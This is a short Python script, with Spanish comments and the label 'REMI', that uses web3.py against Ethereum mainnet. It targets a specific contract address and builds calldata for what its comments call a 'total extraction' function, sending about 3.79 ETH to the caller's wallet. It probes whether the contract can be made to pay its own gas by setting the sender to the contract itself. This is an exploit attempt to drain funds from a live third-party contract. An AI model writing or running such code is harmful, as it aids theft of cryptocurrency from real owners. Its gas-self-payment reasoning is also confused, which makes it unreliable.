from web3 import Web3

w3 = Web3(Web3.HTTPProvider('https://ethereum.publicnode.com'))
target = w3.to_checksum_address('0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf')
tu_wallet = w3.to_checksum_address('0x96De980a766CCb10A19B6962587e2b61B650b372')

print(f"🔬 REMI: Intentando forzar 'Gas-Self-Payment'...")

# Intentamos llamar a la extracción simulando que el contrato paga
# Selector de extracción total: f3ae2415
data_extraccion = "0xf3ae2415" + tu_wallet[2:].lower().zfill(64) + "0000000000000000000000000000000000000000000000003482390a16b80000"

try:
    # Simulamos el 'eth_estimateGas' pero con el contrato como pagador
    gas_propio = w3.eth.estimate_gas({
        'to': target,
        'from': target, # <--- Aquí está el truco: el contrato se llama a sí mismo
        'data': data_extraccion
    })
    print(f"🔥 ¡ÉXITO! El contrato permite auto-pagarse el gas.")
    print(f"📦 Unidades estimadas: {gas_propio}")
except Exception as e:
    print(f"❌ El guardia bloqueó el auto-pago: {str(e)[:50]}...")

